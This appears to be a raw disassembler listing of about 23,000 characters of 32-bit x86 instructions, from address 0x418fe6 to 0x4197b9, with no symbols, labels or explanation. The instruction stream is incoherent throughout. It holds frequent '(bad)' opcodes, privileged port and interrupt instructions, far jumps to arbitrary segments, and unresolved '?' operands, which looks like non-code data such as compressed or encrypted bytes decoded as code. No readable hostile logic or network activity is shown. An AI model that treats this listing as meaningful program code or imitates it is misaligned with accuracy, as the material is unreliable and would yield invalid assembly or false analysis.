  418fe6:	or     ebx,DWORD PTR [eax+0x691c1bb0]
  418fec:	int3   
  418fed:	scas   eax,DWORD PTR es:[edi]
  418fee:	xor    eax,0x4663629d
  418ff3:	cwde   
  418ff4:	pop    ebx
  418ff5:	outs   dx,DWORD PTR ds:[esi]
  418ff6:	and    esi,DWORD PTR [ebx]
  418ff8:	js     0x418fec
  418ffa:	mov    esi,0x4534f3b8
  418fff:	pop    eax
  419000:	nop
  419001:	psubusw mm4,mm0
  419004:	and    esi,DWORD PTR [ecx]
  419006:	cwde   
  419007:	xor    DWORD PTR [ebx-0x2a],edx
  41900a:	mov    dh,0xe2
  41900c:	clc    
  41900d:	jmp    0xaf63:0xb7a81ea5
  419014:	retf   0x36c6
  419017:	cli    
  419018:	ror    DWORD PTR [ebp-0x305f30f3],1
  41901e:	fisubr DWORD PTR [edx+0x429c646b]
  419024:	inc    edx
  419025:	or     esi,edx
  419027:	add    BYTE PTR [edi+ecx*4+0x6195b2fd],dl
  41902e:	adc    eax,0x6783d3d0
  419033:	repz xor BYTE PTR [esi-0x73f8ec18],dl
  41903a:	xchg   edi,eax
  41903b:	int    0xa7
  41903d:	test   eax,0x678e2e3e
  419042:	sub    edi,0x6e
  419045:	dec    ecx
  419046:	repz mov ds:0x5d371113,al
  41904c:	daa    
  41904d:	cmp    BYTE PTR [eax+0x47],bl
  419050:	jge    0x4190a9
  419052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419053:	adc    al,al
  419055:	jg     0x418fd7
  419057:	dec    ebx
  419058:	imul   ebx,ebx,0xffffffab
  41905b:	dec    esi
  41905c:	in     eax,dx
  41905d:	xlat   BYTE PTR ds:[ebx]
  41905e:	inc    edi
  41905f:	lods   eax,DWORD PTR ds:[esi]
  419060:	mov    ?,WORD PTR [ebp+0x5b]
  419063:	lds    edx,FWORD PTR [ebp+0x8c466cb]
  419069:	jae    0x419031
  41906b:	mov    esi,DWORD PTR [eax-0x2cfae73b]
  419071:	fidiv  WORD PTR [edx+0x4d]
  419074:	xor    bl,BYTE PTR [ecx+0x5380541c]
  41907a:	pop    ebx
  41907b:	fdivr  st(0),st
  41907d:	js     0x419053
  41907f:	pop    edx
  419080:	test   BYTE PTR [eax+edi*2+0x7e917250],cl
  419087:	cdq    
  419088:	jns    0x41905d
  41908a:	inc    esp
  41908b:	adc    esi,ebp
  41908d:	es scas eax,DWORD PTR es:[edi]
  41908f:	inc    esi
  419090:	ret    
  419091:	fadd   st(7),st
  419093:	jae    0x419087
  419095:	(bad)  
  419096:	fs test eax,0x1f361571
  41909c:	sbb    BYTE PTR ds:0xef87446f,0xa6
  4190a3:	shl    BYTE PTR [eax+0x36bd1736],cl
  4190a9:	test   DWORD PTR [ebx],ebp
  4190ab:	cmp    dl,bh
  4190ad:	pop    esi
  4190ae:	mov    edx,DWORD PTR [ebx]
  4190b0:	aas    
  4190b1:	lea    edx,[esi+0x55]
  4190b4:	dec    esi
  4190b5:	push   0x16
  4190b7:	mov    cl,0x76
  4190b9:	cli    
  4190ba:	push   ecx
  4190bb:	(bad)  
  4190bc:	ins    BYTE PTR es:[edi],dx
  4190bd:	shl    ah,cl
  4190bf:	xchg   edx,eax
  4190c0:	les    ebx,FWORD PTR [esi]
  4190c2:	sub    eax,0xef469931
  4190c7:	dec    ebp
  4190c8:	xor    cl,BYTE PTR [esi-0x39]
  4190cb:	sbb    al,0x52
  4190cd:	xchg   esi,eax
  4190ce:	mov    esi,0x4b3dde4e
  4190d3:	mov    ebx,0xa4ffa91b
  4190d8:	and    ah,bh
  4190da:	mov    ch,0x2d
  4190dc:	fsubr  QWORD PTR [ebp+0x50daea13]
  4190e2:	mov    dl,0xe5
  4190e4:	push   eax
  4190e5:	lock es popf 
  4190e8:	mov    al,0xd1
  4190ea:	dec    esp
  4190eb:	sar    BYTE PTR [esi-0x60],0xb
  4190ef:	repz das 
  4190f1:	jno    0x419111
  4190f3:	popf   
  4190f4:	repnz mov bl,0xba
  4190f7:	dec    BYTE PTR [ebx-0x4f753d43]
  4190fd:	(bad)  
  4190fe:	in     eax,0x92
  419100:	adc    ebp,DWORD PTR [eax+0x56]
  419103:	jno    0x4190f3
  419105:	adc    ebx,DWORD PTR [edx+0x6f]
  419108:	cli    
  419109:	mov    ds:0x92b0c7f,al
  41910e:	in     eax,dx
  41910f:	aad    0x3a
  419111:	mov    edi,0xbce89f85
  419116:	test   al,0x96
  419118:	bswap  ebp
  41911a:	arpl   WORD PTR [ebx+0x78],bx
  41911d:	jp     0x4190ab
  41911f:	arpl   WORD PTR [ebx],si
  419121:	cmp    BYTE PTR [esp+ecx*2-0x71],ah
  419125:	dec    edx
  419126:	fild   WORD PTR [ecx+eax*1+0x18]
  41912a:	or     al,0xd5
  41912c:	xchg   DWORD PTR ds:0xb24c8b3,esi
  419132:	push   ebx
  419133:	and    al,0x40
  419135:	ja     0x4190cd
  419137:	sub    al,0xb8
  419139:	add    BYTE PTR [edi+0x47],bl
  41913c:	adc    eax,0x939312d1
  419141:	sti    
  419142:	fwait
  419143:	push   esp
  419144:	mov    dl,0xbe
  419146:	or     BYTE PTR [eax],ch
  419148:	mov    esi,0xb373f81d
  41914d:	jmp    0x419179
  41914f:	xor    eax,0xc1845d76
  419154:	(bad)  
  419155:	mov    cs,edi
  419157:	(bad)  
  419158:	int    0x2f
  41915a:	loope  0x4191ae
  41915c:	jmp    0x824f:0x741746ae
  419163:	(bad)  
  419165:	adc    esi,DWORD PTR [ecx+edi*8-0x20]
  419169:	inc    BYTE PTR [ebp-0x17]
  41916c:	and    eax,0xd78b747c
  419171:	and    al,0xf4
  419173:	mov    ds:0x3b3c2601,al
  419178:	dec    esp
  419179:	jp     0x41910b
  41917b:	enter  0x6e63,0x37
  41917f:	jno    0x4191c4
  419181:	inc    edi
  419182:	int3   
  419183:	inc    ebx
  419184:	inc    ebx
  419185:	push   ebx
  419186:	inc    esi
  419187:	xchg   ebx,eax
  419188:	mul    edx
  41918a:	sets   BYTE PTR gs:[ebp-0x7d706775]
  419192:	sub    esp,esi
  419194:	gs call 0xc188:0x88c60392
  41919c:	or     eax,0xb51a79b3
  4191a1:	popf   
  4191a2:	and    esi,DWORD PTR [ecx]
  4191a4:	mov    edx,0x3f3e0af1
  4191a9:	(bad)  
  4191aa:	mul    ah
  4191ac:	repnz lock mov dl,0x48
  4191b0:	test   BYTE PTR [edi+edi*1-0x53],cl
  4191b4:	sti    
  4191b5:	mov    ?,WORD PTR [ebx-0x7]
  4191b8:	rol    esp,1
  4191ba:	push   ebp
  4191bb:	sbb    al,0xc6
  4191bd:	ins    DWORD PTR es:[edi],dx
  4191be:	push   0xdb44447e
  4191c3:	and    al,0xe1
  4191c5:	outs   dx,BYTE PTR ds:[esi]
  4191c6:	xor    al,0xff
  4191c8:	mov    ebp,esi
  4191ca:	dec    esi
  4191cb:	mov    bl,al
  4191cd:	aas    
  4191ce:	mov    ebx,0xb94e77dd
  4191d3:	cmp    dl,BYTE PTR [edi]
  4191d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191d7:	and    DWORD PTR [ebx+edx*2-0x1db3684d],edi
  4191de:	nop
  4191df:	push   0xffffffc2
  4191e1:	std    
  4191e2:	mov    edi,DWORD PTR [eax-0x2a83ca99]
  4191e8:	hlt    
  4191e9:	xchg   eax,ebx
  4191eb:	cli    
  4191ec:	out    dx,al
  4191ed:	mov    esp,0x9d16d930
  4191f2:	shr    BYTE PTR [ebx+0x5323d8b4],cl
  4191f8:	repz rcl esi,1
  4191fb:	imul   edx,DWORD PTR [edi-0x13],0x4f
  4191ff:	ret    0x3f6
  419202:	xor    dh,BYTE PTR [ecx+0x7d]
  419205:	dec    edi
  419206:	ret    0xef4a
  419209:	or     DWORD PTR ds:0xaf80ad65,edx
  41920f:	add    eax,0x60fd530a
  419214:	mov    ebx,0x253c55d4
  419219:	cmp    eax,DWORD PTR [edx+0x1c7b37b0]
  41921f:	iret   
  419220:	sbb    DWORD PTR [ebp-0x73044a23],eax
  419226:	out    0xb8,eax
  419228:	arpl   dx,sp
  41922a:	dec    edx
  41922b:	pop    ebx
  41922c:	mov    ds:0x7d4baad5,eax
  419231:	mov    eax,0xa5c1d6f1
  419236:	jl     0x419287
  419238:	inc    edi
  419239:	cmp    esi,DWORD PTR [ebx+0x3aef6610]
  41923f:	mov    WORD PTR [ebx+0x47],cs
  419242:	data16 add al,0x75
  419245:	dec    eax
  419246:	addr16 stc 
  419248:	scas   eax,DWORD PTR es:[edi]
  419249:	dec    eax
  41924a:	(bad)  
  41924d:	mov    ecx,0xdbc7d7f9
  419252:	dec    eax
  419253:	int    0x60
  419255:	cwde   
  419256:	retf   0x2fc7
  419259:	ds popf 
  41925b:	outs   dx,BYTE PTR ds:[esi]
  41925c:	sbb    DWORD PTR [ecx-0x2991fcd3],0x327a1fb3
  419266:	fwait
  419267:	lds    esp,FWORD PTR ds:0xe3f0d6d0
  41926d:	lock test cl,ch
  419270:	mov    dl,0x67
  419272:	sahf   
  419273:	xor    BYTE PTR [ebx],0x40
  419276:	lods   eax,DWORD PTR ds:[esi]
  419277:	pop    ss
  419278:	push   esi
  419279:	retf   
  41927a:	retf   
  41927b:	sbb    al,0x3b
  41927d:	inc    ebx
  41927e:	push   edx
  41927f:	jmp    0x23b4:0x4f521eba
  419286:	adc    edx,DWORD PTR [esi-0x563d12a7]
  41928c:	mov    bl,0xf4
  41928e:	daa    
  41928f:	arpl   WORD PTR [esi+0x29b970f2],bx
  419295:	jmp    0x4192c6
  419297:	adc    BYTE PTR [ecx-0xd],cl
  41929a:	enter  0xc59d,0xe3
  41929e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41929f:	push   edx
  4192a0:	paddsb mm1,QWORD PTR [edx+0xc9d7e47]
  4192a7:	cmp    eax,0x340652b
  4192ac:	aaa    
  4192ad:	scas   al,BYTE PTR es:[edi]
  4192ae:	lahf   
  4192af:	arpl   bx,si
  4192b1:	adc    edi,DWORD PTR [edx-0x68f13e24]
  4192b7:	call   0x71a4:0xd1648e37
  4192be:	inc    ecx
  4192bf:	or     cl,al
  4192c1:	mov    eax,0xc9400cf5
  4192c6:	or     BYTE PTR [eax],dh
  4192c8:	sbb    eax,0x5fc4d646
  4192cd:	push   ds
  4192ce:	cld    
  4192cf:	mov    dl,0x90
  4192d1:	repz sub cl,BYTE PTR [ebx+0xd]
  4192d5:	ror    dl,1
  4192d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192d8:	outs   dx,DWORD PTR ds:[esi]
  4192d9:	mov    ebx,0x647140e7
  4192de:	loopne 0x4192af
  4192e0:	(bad)  
  4192e1:	out    dx,al
  4192e2:	cli    
  4192e3:	cmp    edi,0x19
  4192e6:	adc    al,0xf8
  4192e8:	out    dx,al
  4192e9:	(bad)  
  4192ea:	imul   esp,edi,0x17
  4192ed:	jmp    0x2e9b9e40
  4192f2:	sub    BYTE PTR [ecx-0x7a],bh
  4192f5:	mov    ecx,0x38f9f578
  4192fa:	adc    ah,BYTE PTR [edi+0x41]
  4192fd:	jne    0x419363
  4192ff:	scas   eax,DWORD PTR es:[edi]
  419300:	xor    DWORD PTR [edi+0x9],ecx
  419303:	idiv   BYTE PTR [edx]
  419305:	pop    esp
  419306:	dec    edx
  419307:	and    ecx,esp
  419309:	clc    
  41930a:	aaa    
  41930b:	adc    BYTE PTR [eax],al
  41930d:	in     eax,dx
  41930e:	loop   0x4192e0
  419310:	xchg   edx,eax
  419311:	mov    cl,0x6c
  419313:	xor    esp,esp
  419315:	sbb    BYTE PTR [ecx+0x0],dl
  419318:	push   esi
  419319:	push   edi
  41931a:	xchg   esp,eax
  41931b:	push   ebp
  41931c:	pop    edx
  41931d:	fnstsw WORD PTR [ecx]
  41931f:	add    bh,BYTE PTR [esi-0x615bdb7]
  419325:	in     eax,dx
  419326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419327:	cli    
  419328:	test   BYTE PTR [edx],dl
  41932a:	aaa    
  41932b:	leave  
  41932c:	scas   eax,DWORD PTR es:[edi]
  41932d:	in     eax,0x2f
  41932f:	data16 cli 
  419331:	retf   
  419332:	adc    eax,0x2d651012
  419337:	pop    eax
  419338:	into   
  419339:	std    
  41933a:	aaa    
  41933b:	popa   
  41933c:	pop    edx
  41933d:	ds mov al,ds:0xb1fa642a
  419344:	pop    es
  419345:	dec    ebx
  419346:	push   0xffffffa0
  419348:	iret   
  419349:	icebp  
  41934a:	adc    al,0xd5
  41934c:	scas   al,BYTE PTR es:[edi]
  41934d:	pop    edi
  41934e:	xchg   ebx,eax
  41934f:	jbe    0x41930f
  419351:	mov    dh,0xfa
  419353:	daa    
  419354:	adc    al,0x30
  419356:	or     eax,0x58e089cd
  41935b:	add    esi,ebx
  41935d:	ret    0x7750
  419360:	(bad)  
  419361:	xor    DWORD PTR [ecx],ecx
  419363:	mov    BYTE PTR [eax+0x50],bh
  419366:	cwde   
  419367:	(bad)  
  419368:	or     DWORD PTR [esi-0x6167279c],esp
  41936e:	mov    bh,0xa3
  419370:	scas   al,BYTE PTR es:[edi]
  419371:	(bad)  
  419372:	push   ecx
  419373:	out    dx,al
  419374:	dec    eax
  419375:	xchg   DWORD PTR [ebx-0x8],ebp
  419378:	push   es
  419379:	out    0xc1,al
  41937b:	mov    ds:0xfd7c424f,eax
  419380:	test   esi,eax
  419382:	retf   0xf312
  419385:	jne    0x419393
  419387:	les    edi,FWORD PTR [edi+0x2]
  41938a:	ret    
  41938b:	loopne 0x4193e8
  41938d:	(bad)  
  41938e:	lahf   
  41938f:	or     DWORD PTR [edi+0x8072b1c],ebp
  419395:	mov    eax,0xc2321fb8
  41939a:	js     0x419392
  41939c:	loop   0x419363
  41939e:	pusha  
  41939f:	jmp    0x419366
  4193a1:	mov    edx,0xe04cce71
  4193a6:	mov    DWORD PTR [edi-0x7b],edx
  4193a9:	iret   
  4193aa:	or     edi,0x70
  4193ad:	cmp    DWORD PTR [ebx-0x19],0xa10f0d32
  4193b4:	pop    esp
  4193b5:	or     al,0xe2
  4193b7:	clc    
  4193b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193b9:	mov    ebx,0x834d739d
  4193be:	cmp    cl,ah
  4193c0:	jp     0x41941f
  4193c2:	mov    dh,0xcf
  4193c4:	repnz lock push ss
  4193c7:	xlat   BYTE PTR ds:[ebx]
  4193c8:	out    dx,al
  4193c9:	lods   eax,DWORD PTR ds:[esi]
  4193ca:	mov    eax,ds:0xd0eeed97
  4193cf:	repnz in eax,dx
  4193d1:	call   0xc5879af9
  4193d6:	inc    ebx
  4193d7:	retf   
  4193d8:	push   edx
  4193d9:	mov    ah,bl
  4193db:	sbb    edi,DWORD PTR [ebx]
  4193dd:	lods   al,BYTE PTR ds:[esi]
  4193de:	push   eax
  4193df:	xchg   ecx,eax
  4193e0:	lahf   
  4193e1:	cwde   
  4193e2:	mov    ah,0x7b
  4193e4:	hlt    
  4193e5:	ret    0xf81d
  4193e8:	sbb    cl,ah
  4193ea:	push   es
  4193eb:	sbb    esp,edx
  4193ed:	jg     0x419371
  4193ef:	or     edi,ebx
  4193f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193f2:	in     eax,dx
  4193f3:	(bad)  
  4193f4:	daa    
  4193f5:	mov    bl,BYTE PTR [eax-0x46]
  4193f8:	jbe    0x4193e0
  4193fa:	fdivr  DWORD PTR ds:0xe49e427d
  419400:	push   esi
  419401:	pusha  
  419402:	in     eax,0xa
  419404:	pop    edx
  419405:	adc    ah,BYTE PTR [eax-0x487921f0]
  41940b:	in     al,0x38
  41940d:	dec    esi
  41940e:	xor    al,0xab
  419410:	pop    esi
  419411:	adc    bh,bh
  419413:	fwait
  419414:	xor    dl,al
  419416:	and    BYTE PTR [ecx],0xdf
  419419:	pusha  
  41941a:	inc    esp
  41941b:	mov    ah,0x89
  41941d:	jae    0x419457
  41941f:	pop    edx
  419420:	add    dl,bl
  419422:	repz fwait
  419424:	push   cs
  419425:	pop    edx
  419426:	cmp    BYTE PTR [edi-0x31],dl
  419429:	adc    bh,BYTE PTR [edx+0x74]
  41942c:	add    eax,0x19960f98
  419431:	ja     0x419413
  419433:	test   BYTE PTR [ebx],bh
  419435:	jbe    0x4193e4
  419437:	push   ds
  419438:	xor    eax,DWORD PTR [eax-0x48]
  41943b:	mov    dh,0x2c
  41943d:	retf   0x2e89
  419440:	icebp  
  419441:	je     0x419433
  419443:	inc    ebp
  419444:	jbe    0x4194b3
  419446:	retf   0xbf70
  419449:	cmp    dh,0xc9
  41944c:	add    esi,DWORD PTR [edx]
  41944e:	add    BYTE PTR [ebp+0x42],bh
  419451:	fstp   QWORD PTR [ebp+0x13612ebf]
  419457:	mov    DWORD PTR [ebx+ecx*4-0xba5ca62],eax
  41945e:	push   edi
  41945f:	push   ss
  419460:	and    al,0x2a
  419462:	inc    edi
  419463:	xor    eax,0x87680b48
  419468:	cmp    eax,0x87d90dfd
  41946d:	push   ds
  41946e:	stc    
  41946f:	cs inc ebx
  419471:	sar    ebx,cl
  419473:	out    dx,eax
  419474:	les    ecx,FWORD PTR [ebp-0x697d7751]
  41947a:	mov    WORD PTR [esi],?
  41947c:	cmp    ch,BYTE PTR [ebp+0x10]
  41947f:	mov    dh,0xee
  419481:	xor    al,bh
  419483:	push   ds
  419484:	nop
  419485:	xchg   edi,ebp
  419487:	ja     0x419495
  419489:	out    dx,al
  41948a:	loop   0x4194b0
  41948c:	push   cs
  41948d:	ds mov esp,0xb5e0d926
  419493:	jb     0x4194f9
  419495:	stos   DWORD PTR es:[edi],eax
  419496:	data16 add cl,BYTE PTR [ebp+0xc3b29f3]
  41949d:	add    BYTE PTR [esp+ecx*1+0xc],ah
  4194a1:	cdq    
  4194a2:	adc    ch,BYTE PTR [ebx+edi*2+0x59]
  4194a6:	mov    bl,0x2d
  4194a8:	push   ds
  4194a9:	popa   
  4194aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194ab:	and    dl,ch
  4194ad:	sti    
  4194ae:	xchg   ebp,eax
  4194af:	test   eax,0x915cf2c1
  4194b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194b5:	sahf   
  4194b6:	jne    0x41949b
  4194b8:	frstor [eax]
  4194ba:	into   
  4194bb:	mov    cl,0x12
  4194bd:	dec    ecx
  4194be:	push   edi
  4194bf:	jl     0x419525
  4194c1:	xchg   BYTE PTR [edi-0x724ff7cf],bl
  4194c7:	pop    edi
  4194c8:	mov    ch,0x75
  4194ca:	xchg   ebx,eax
  4194cb:	dec    ebx
  4194cc:	add    al,0xcc
  4194ce:	pop    ss
  4194cf:	bound  edx,QWORD PTR [edx+0xf]
  4194d2:	(bad)  
  4194d3:	inc    edi
  4194d4:	mov    dl,0x99
  4194d6:	mov    ebp,0xbc5ed00a
  4194db:	fidivr WORD PTR ds:0x94ae4871
  4194e1:	pop    edx
  4194e2:	shl    BYTE PTR [edi],1
  4194e4:	jge    0x41952d
  4194e6:	add    BYTE PTR [eax+0x3f8704c7],cl
  4194ec:	push   ebp
  4194ed:	rcl    BYTE PTR [ecx-0x15],1
  4194f0:	pop    ss
  4194f1:	ds pop edx
  4194f3:	push   ebx
  4194f4:	mov    ds:0x4611fd7b,al
  4194f9:	mov    ebx,0xfae3c0e
  4194fe:	add    BYTE PTR [esi+ebx*2-0x167daf8d],dh
  419505:	aad    0x4b
  419507:	es push eax
  419509:	add    esi,DWORD PTR ds:0x9d5178d8
  41950f:	shl    edi,0xb8
  419512:	adc    BYTE PTR [ebp-0x9],cl
  419515:	repnz retf 0xeb20
  419519:	call   0x20a524bf
  41951e:	xor    BYTE PTR [ecx+0x53],ch
  419521:	clc    
  419522:	add    DWORD PTR [edi-0x75e88276],esi
  419528:	xlat   BYTE PTR ds:[ebx]
  419529:	push   ebx
  41952a:	push   ss
  41952b:	push   edi
  41952c:	lahf   
  41952d:	mov    ds:0xebcdc74b,al
  419532:	adc    al,dh
  419534:	stos   BYTE PTR es:[edi],al
  419535:	inc    edx
  419536:	or     al,0x68
  419538:	jmp    0xbe5c36b8
  41953d:	and    eax,0xb7f1dedf
  419542:	and    ebx,DWORD PTR [edi+ecx*8]
  419545:	push   es
  419546:	push   ebx
  419547:	rcr    edx,0xd0
  41954a:	jns    0x41953c
  41954c:	xchg   edi,eax
  41954d:	jmp    0xb4d6bde3
  419552:	pusha  
  419553:	xor    al,0x50
  419555:	gs scas al,BYTE PTR es:[edi]
  419557:	fs jne 0x41951d
  41955a:	adc    eax,0x3c5b44fd
  41955f:	push   0x4359d9a
  419564:	and    dl,BYTE PTR [edi+0x7b]
  419567:	ss pusha 
  419569:	popa   
  41956a:	adc    DWORD PTR ds:0xa0c94858,esp
  419570:	xor    ebx,esi
  419572:	and    bh,BYTE PTR [ebp+0x32]
  419575:	pop    esi
  419576:	fsubp  st(1),st
  419578:	xor    bl,BYTE PTR [ebp+0x4e01ca77]
  41957e:	mul    BYTE PTR [ebx]
  419580:	frstor [esi-0x39d0f4e5]
  419586:	push   edi
  419587:	pop    ecx
  419588:	push   edx
  419589:	inc    edx
  41958a:	inc    eax
  41958b:	addr16 (bad) 
  41958d:	loopne 0x4195f7
  41958f:	dec    ebp
  419590:	les    edx,FWORD PTR [ecx-0x24a15142]
  419596:	(bad)  
  419597:	scas   eax,DWORD PTR es:[edi]
  419598:	call   0x1488936c
  41959d:	lods   eax,DWORD PTR ds:[esi]
  41959e:	sub    DWORD PTR [eax-0x2c],ecx
  4195a1:	and    eax,0x77d8ca27
  4195a6:	add    DWORD PTR [esi+0x1857b5e2],0xffdbc3ad
  4195b0:	or     DWORD PTR [ecx+0x57],esi
  4195b3:	ret    0xce59
  4195b6:	jp     0x41960c
  4195b8:	push   ds
  4195b9:	push   esi
  4195ba:	pop    edi
  4195bb:	enter  0x714a,0xba
  4195bf:	dec    eax
  4195c0:	add    BYTE PTR [esi+0x6cdf305b],cl
  4195c6:	mov    cl,0x16
  4195c8:	inc    eax
  4195c9:	(bad)  
  4195ca:	int3   
  4195cb:	stc    
  4195cc:	lock mov ds:0x2bd7109d,al
  4195d2:	push   0x5c767581
  4195d7:	(bad)  
  4195d8:	lods   eax,DWORD PTR ds:[esi]
  4195d9:	jle    0x4195fd
  4195db:	mov    ebx,0x61c1b54
  4195e0:	ins    DWORD PTR es:[edi],dx
  4195e1:	adc    al,0xc3
  4195e3:	scas   eax,DWORD PTR es:[edi]
  4195e4:	popa   
  4195e5:	(bad)  
  4195e6:	sar    DWORD PTR [eax+0x32b2c5b7],1
  4195ec:	ret    
  4195ed:	sbb    DWORD PTR [ecx+0x9be342e],ebp
  4195f3:	fldenv [eax+0x1b]
  4195f6:	mov    edi,0xe3b627aa
  4195fb:	push   cs
  4195fc:	mov    WORD PTR [ebx-0x79944aa8],ss
  419602:	fidiv  WORD PTR [edx-0x755089b5]
  419608:	loope  0x419631
  41960a:	jmp    0xf3b2022f
  41960f:	xor    al,BYTE PTR [esi-0x32]
  419612:	push   eax
  419613:	ror    ah,1
  419615:	push   es
  419616:	lock mov ds:0xdd8859e4,eax
  41961c:	mov    ch,0x5e
  41961e:	pop    ss
  41961f:	out    0xca,al
  419621:	pop    esi
  419622:	nop
  419623:	ins    DWORD PTR es:[edi],dx
  419624:	xor    al,0xe1
  419626:	scas   al,BYTE PTR es:[edi]
  419627:	mov    dh,BYTE PTR [ecx]
  419629:	push   ebp
  41962a:	scas   eax,DWORD PTR es:[edi]
  41962b:	(bad)  
  41962d:	rcr    DWORD PTR [bp-0x2245],1
  419632:	sub    bh,dh
  419634:	pop    ds
  419635:	push   edx
  419636:	fs std 
  419638:	add    esp,DWORD PTR [esp+ebx*8+0x2c]
  41963c:	dec    edx
  41963d:	jb     0x419626
  41963f:	xchg   esi,eax
  419640:	in     eax,0x91
  419642:	repz jbe 0x419679
  419645:	push   esp
  419646:	ror    DWORD PTR [edx],0xcf
  419649:	imul   edx,edi,0x19ab50f1
  41964f:	fnsave [ecx-0x35]
  419652:	jbe    0x4195e1
  419654:	cmp    DWORD PTR [ebx-0xb2401],0x7d9be6e6
  41965e:	rcr    esp,cl
  419660:	add    eax,0xa16319d9
  419665:	or     eax,0xb0bcfee
  41966a:	mov    ds:0xc1bb9b12,al
  41966f:	jae    0x4196c7
  419671:	ds loope 0x41967a
  419674:	dec    edx
  419675:	push   ds
  419676:	adc    al,0x52
  419678:	sti    
  419679:	and    ebx,DWORD PTR [edx]
  41967b:	std    
  41967c:	push   ebx
  41967d:	shr    edx,cl
  41967f:	pop    eax
  419680:	stos   BYTE PTR es:[edi],al
  419681:	jbe    0x419677
  419683:	mov    ch,0x35
  419685:	fs xchg ebp,eax
  419687:	inc    ebp
  419688:	push   esi
  419689:	mov    ds:0xcb90dad5,eax
  41968e:	mov    eax,ds:0xd31f2ae6
  419693:	leave  
  419694:	cmp    BYTE PTR [si-0x38ca],bh
  419699:	aas    
  41969a:	xchg   ebx,eax
  41969b:	imul   ecx,DWORD PTR [edi+0x20791e34],0xffffffe2
  4196a2:	outs   dx,DWORD PTR ds:[esi]
  4196a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196a4:	lock cmp bh,BYTE PTR [ecx-0x29]
  4196a8:	inc    edx
  4196a9:	lds    esi,FWORD PTR [ecx+0x5489fa9d]
  4196af:	mov    ds:0x24f61c30,al
  4196b4:	pop    eax
  4196b5:	jp     0x419705
  4196b7:	out    0x4d,al
  4196b9:	(bad)  
  4196ba:	and    ecx,ebp
  4196bc:	and    DWORD PTR [ecx],edi
  4196be:	addr16 push 0x13
  4196c1:	repz sbb ah,BYTE PTR [ecx]
  4196c4:	or     edi,DWORD PTR [ebp-0x67]
  4196c7:	hlt    
  4196c8:	dec    esi
  4196c9:	pop    eax
  4196ca:	dec    ebp
  4196cb:	jl     0x4196eb
  4196cd:	dec    esp
  4196ce:	push   ss
  4196cf:	(bad)  
  4196d1:	dec    esi
  4196d2:	adc    DWORD PTR [edi+0x101558f6],edi
  4196d8:	fstp   TBYTE PTR [edx]
  4196da:	in     eax,dx
  4196db:	mov    ebp,DWORD PTR [edx]
  4196dd:	dec    esi
  4196de:	in     eax,dx
  4196df:	jns    0x419704
  4196e1:	ret    
  4196e2:	cs cdq 
  4196e4:	and    al,0x98
  4196e6:	in     al,dx
  4196e7:	add    ebx,DWORD PTR [edx+0x5f7fdd71]
  4196ed:	pop    es
  4196ee:	imul   edx,DWORD PTR [esi],0xffffff83
  4196f1:	xlat   BYTE PTR ds:[ebx]
  4196f2:	sub    dl,BYTE PTR [esi+0x4f454bd0]
  4196f8:	xor    al,bl
  4196fa:	fstp   QWORD PTR [esp+ebp*1]
  4196fd:	mov    al,ds:0x3791f317
  419702:	xchg   esi,eax
  419703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419704:	mov    ds:0x72b45ecc,eax
  419709:	jmp    0x419757
  41970b:	jle    0x419705
  41970d:	int    0xf6
  41970f:	dec    ebp
  419710:	add    esi,DWORD PTR [edi-0x39]
  419713:	or     al,0x4d
  419715:	call   DWORD PTR [ebx]
  419717:	sub    al,0x5a
  419719:	(bad)  
  41971a:	cli    
  41971b:	fxch   st(6)
  41971d:	adc    BYTE PTR [edx+0x2f],al
  419720:	xlat   BYTE PTR ds:[ebx]
  419721:	adc    al,0xd9
  419723:	pop    ecx
  419724:	outs   dx,DWORD PTR ds:[esi]
  419725:	cmp    BYTE PTR [eax-0x30],0x4a
  419729:	shr    DWORD PTR [edi+0x7],0x7f
  41972d:	neg    BYTE PTR [esi+0x25]
  419730:	in     eax,dx
  419731:	mov    dh,0x10
  419733:	in     al,0x6a
  419735:	out    0xac,al
  419737:	dec    edi
  419738:	push   ebx
  419739:	push   0xfd330a98
  41973e:	test   ah,ah
  419740:	in     eax,dx
  419741:	(bad)  
  419743:	push   ecx
  419744:	sbb    edi,edx
  419746:	jno    0x4197bd
  419748:	mov    bl,0x4b
  41974a:	sbb    ebx,DWORD PTR [ebp-0x54]
  41974d:	sbb    al,0xa7
  41974f:	jge    0x419728
  419751:	push   eax
  419752:	daa    
  419753:	lea    edi,[edi]
  419755:	xor    eax,0xb75d7991
  41975a:	xlat   BYTE PTR ds:[ebx]
  41975b:	or     BYTE PTR [edi-0x58184df5],bl
  419761:	sub    BYTE PTR [edx-0x58aa06f5],ch
  419767:	out    0x8b,al
  419769:	adc    DWORD PTR [edi+0x57],0xffffffca
  41976d:	scas   eax,DWORD PTR es:[edi]
  41976e:	mov    ch,0xe8
  419770:	ins    DWORD PTR es:[edi],dx
  419771:	in     eax,dx
  419772:	repnz lods al,BYTE PTR es:[esi]
  419775:	mov    DWORD PTR [ebp+ebp*8-0x478a02e2],eax
  41977c:	mov    esi,0x332e221
  419781:	dec    esp
  419782:	(bad)  
  419783:	pop    ecx
  419784:	dec    ebx
  419785:	aas    
  419786:	jge    0x4197b4
  419788:	rcl    edx,cl
  41978a:	lods   al,BYTE PTR ds:[esi]
  41978b:	cli    
  41978c:	sar    DWORD PTR [ecx],0x8f
  41978f:	xchg   BYTE PTR ds:0xfd432627,ah
  419795:	jge    0x419769
  419797:	ret    0xe349
  41979a:	js     0x41978c
  41979c:	pop    ds
  41979d:	mov    ah,0x5a
  41979f:	fs jmp 0x573ca8ad
  4197a5:	or     esi,ebx
  4197a7:	push   0xfffffffa
  4197a9:	add    ah,bl
  4197ab:	inc    ecx
  4197ac:	fstp   TBYTE PTR ds:0xc9e0c2d2
  4197b2:	or     dl,BYTE PTR [esi-0x20]
  4197b5:	mov    esp,ss
  4197b7:	xchg   edx,eax
  4197b8:	scas   al,BYTE PTR es:[edi]
  4197b9:	fcom   DWORD PTR [edx+eax*4+0x64]
